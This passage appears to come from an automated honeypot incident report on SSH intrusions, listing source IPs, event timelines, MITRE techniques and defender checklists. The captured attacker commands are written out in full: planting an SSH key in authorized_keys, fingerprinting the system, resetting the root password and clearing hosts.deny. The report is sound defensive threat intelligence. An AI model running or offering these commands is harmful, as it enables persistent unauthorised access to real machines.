| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:56:04` | `cowrie.session.connect` |
| `2026-07-04 02:56:04` | `cowrie.client.version` |
| `2026-07-04 02:56:04` | `cowrie.client.kex` |
| `2026-07-04 02:56:05` | `cowrie.login.success` |
| `2026-07-04 02:56:06` | `cowrie.session.params` |
| `2026-07-04 02:56:06` | `cowrie.command.input` |
| `2026-07-04 02:56:06` | `cowrie.command.failed` |
| `2026-07-04 02:56:06` | `cowrie.log.closed` |
| `2026-07-04 02:56:07` | `cowrie.session.params` |
| `2026-07-04 02:56:07` | `cowrie.command.input` |
| `2026-07-04 02:56:08` | `cowrie.session.file_download` |
| `2026-07-04 02:56:08` | `cowrie.log.closed` |
| `2026-07-04 02:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c27ff1c00be6

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-07-04 02:56 |
| **Last Seen** | 2026-07-04 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:56:08` | `cowrie.session.connect` |
| `2026-07-04 02:56:08` | `cowrie.client.version` |
| `2026-07-04 02:56:08` | `cowrie.client.kex` |
| `2026-07-04 02:56:09` | `cowrie.login.success` |
| `2026-07-04 02:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77b9e0f4f56

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-07-04 02:56 |
| **Last Seen** | 2026-07-04 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:56:10` | `cowrie.session.connect` |
| `2026-07-04 02:56:10` | `cowrie.client.version` |
| `2026-07-04 02:56:10` | `cowrie.client.kex` |
| `2026-07-04 02:56:11` | `cowrie.login.success` |
| `2026-07-04 02:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f32b28338d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 02:56 |
| **Last Seen** | 2026-07-04 02:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:56:42` | `cowrie.session.connect` |
| `2026-07-04 02:56:42` | `cowrie.client.version` |
| `2026-07-04 02:56:42` | `cowrie.client.kex` |
| `2026-07-04 02:56:46` | `cowrie.login.success` |
| `2026-07-04 02:56:47` | `cowrie.session.params` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.success` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:47` | `cowrie.command.input` |
| `2026-07-04 02:56:48` | `cowrie.log.closed` |
| `2026-07-04 02:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660c2b202ebf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 02:58 |
| **Last Seen** | 2026-07-04 02:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:58:21` | `cowrie.session.connect` |
| `2026-07-04 02:58:22` | `cowrie.client.version` |
| `2026-07-04 02:58:22` | `cowrie.client.kex` |
| `2026-07-04 02:58:23` | `cowrie.login.success` |
| `2026-07-04 02:58:24` | `cowrie.session.params` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.success` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:24` | `cowrie.command.input` |
| `2026-07-04 02:58:25` | `cowrie.log.closed` |
| `2026-07-04 02:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f42200280cd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 02:59 |
| **Last Seen** | 2026-07-04 02:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 02:59:42` | `cowrie.session.connect` |
| `2026-07-04 02:59:43` | `cowrie.client.version` |
| `2026-07-04 02:59:43` | `cowrie.client.kex` |
| `2026-07-04 02:59:44` | `cowrie.login.success` |
| `2026-07-04 02:59:45` | `cowrie.session.params` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.success` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:45` | `cowrie.command.input` |
| `2026-07-04 02:59:46` | `cowrie.log.closed` |
| `2026-07-04 02:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf5a8dc4276

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-07-04 03:02 |
| **Last Seen** | 2026-07-04 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:02:19` | `cowrie.session.connect` |
| `2026-07-04 03:02:19` | `cowrie.client.version` |
| `2026-07-04 03:02:19` | `cowrie.client.kex` |
| `2026-07-04 03:02:19` | `cowrie.login.success` |
| `2026-07-04 03:02:20` | `cowrie.session.params` |
| `2026-07-04 03:02:20` | `cowrie.command.input` |
| `2026-07-04 03:02:20` | `cowrie.command.failed` |
| `2026-07-04 03:02:20` | `cowrie.log.closed` |
| `2026-07-04 03:02:20` | `cowrie.session.params` |
| `2026-07-04 03:02:20` | `cowrie.command.input` |
| `2026-07-04 03:02:20` | `cowrie.session.file_download` |
| `2026-07-04 03:02:20` | `cowrie.log.closed` |
| `2026-07-04 03:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eedf5deaa6c

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-07-04 03:02 |
| **Last Seen** | 2026-07-04 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:02:20` | `cowrie.session.connect` |
| `2026-07-04 03:02:20` | `cowrie.client.version` |
| `2026-07-04 03:02:20` | `cowrie.client.kex` |
| `2026-07-04 03:02:20` | `cowrie.login.success` |
| `2026-07-04 03:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ae472d1efc

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-07-04 03:02 |
| **Last Seen** | 2026-07-04 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:02:20` | `cowrie.session.connect` |
| `2026-07-04 03:02:20` | `cowrie.client.version` |
| `2026-07-04 03:02:21` | `cowrie.client.kex` |
| `2026-07-04 03:02:21` | `cowrie.login.success` |
| `2026-07-04 03:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fcdbc19a444

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:02 |
| **Last Seen** | 2026-07-04 03:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:02:29` | `cowrie.session.connect` |
| `2026-07-04 03:02:29` | `cowrie.client.version` |
| `2026-07-04 03:02:29` | `cowrie.client.kex` |
| `2026-07-04 03:02:30` | `cowrie.login.success` |
| `2026-07-04 03:02:31` | `cowrie.session.params` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.success` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.command.input` |
| `2026-07-04 03:02:31` | `cowrie.log.closed` |
| `2026-07-04 03:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d73c2ae7a2b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:03 |
| **Last Seen** | 2026-07-04 03:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:03:52` | `cowrie.session.connect` |
| `2026-07-04 03:03:52` | `cowrie.client.version` |
| `2026-07-04 03:03:52` | `cowrie.client.kex` |
| `2026-07-04 03:03:52` | `cowrie.login.success` |
| `2026-07-04 03:03:53` | `cowrie.session.params` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.success` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:53` | `cowrie.command.input` |
| `2026-07-04 03:03:54` | `cowrie.log.closed` |
| `2026-07-04 03:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457fd1bbdd89

| Field | Detail |
|---|---|
| **Source IP** | `189.240.44[.]9` |
| **First Seen** | 2026-07-04 03:04 |
| **Last Seen** | 2026-07-04 03:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:04:57` | `cowrie.session.connect` |
| `2026-07-04 03:04:57` | `cowrie.client.version` |
| `2026-07-04 03:04:57` | `cowrie.client.kex` |
| `2026-07-04 03:04:57` | `cowrie.login.success` |
| `2026-07-04 03:04:58` | `cowrie.session.params` |
| `2026-07-04 03:04:58` | `cowrie.command.input` |
| `2026-07-04 03:04:58` | `cowrie.command.failed` |
| `2026-07-04 03:04:58` | `cowrie.log.closed` |
| `2026-07-04 03:04:59` | `cowrie.session.params` |
| `2026-07-04 03:04:59` | `cowrie.command.input` |
| `2026-07-04 03:04:59` | `cowrie.session.file_download` |
| `2026-07-04 03:04:59` | `cowrie.log.closed` |
| `2026-07-04 03:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.240.44[.]9` to AbuseIPDB if not already reported
- [ ] Block `189.240.44[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afc06180eca

| Field | Detail |
|---|---|
| **Source IP** | `189.240.44[.]9` |
| **First Seen** | 2026-07-04 03:04 |
| **Last Seen** | 2026-07-04 03:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:04:59` | `cowrie.session.connect` |
| `2026-07-04 03:04:59` | `cowrie.client.version` |
| `2026-07-04 03:04:59` | `cowrie.client.kex` |
| `2026-07-04 03:05:00` | `cowrie.login.success` |
| `2026-07-04 03:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.240.44[.]9` to AbuseIPDB if not already reported
- [ ] Block `189.240.44[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33eca4b71d46

| Field | Detail |
|---|---|
| **Source IP** | `189.240.44[.]9` |
| **First Seen** | 2026-07-04 03:05 |
| **Last Seen** | 2026-07-04 03:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:05:00` | `cowrie.session.connect` |
| `2026-07-04 03:05:00` | `cowrie.client.version` |
| `2026-07-04 03:05:00` | `cowrie.client.kex` |
| `2026-07-04 03:05:00` | `cowrie.login.success` |
| `2026-07-04 03:05:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.240.44[.]9` to AbuseIPDB if not already reported
- [ ] Block `189.240.44[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96779deb54a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:05 |
| **Last Seen** | 2026-07-04 03:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:05:15` | `cowrie.session.connect` |
| `2026-07-04 03:05:15` | `cowrie.client.version` |
| `2026-07-04 03:05:16` | `cowrie.client.kex` |
| `2026-07-04 03:05:16` | `cowrie.login.success` |
| `2026-07-04 03:05:17` | `cowrie.session.params` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.success` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:17` | `cowrie.command.input` |
| `2026-07-04 03:05:18` | `cowrie.log.closed` |
| `2026-07-04 03:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1946de54ae02

| Field | Detail |
|---|---|
| **Source IP** | `121.229.25[.]10` |
| **First Seen** | 2026-07-04 03:06 |
| **Last Seen** | 2026-07-04 03:07 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tYfcq8ECAKyk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:06:30` | `cowrie.session.connect` |
| `2026-07-04 03:06:30` | `cowrie.client.version` |
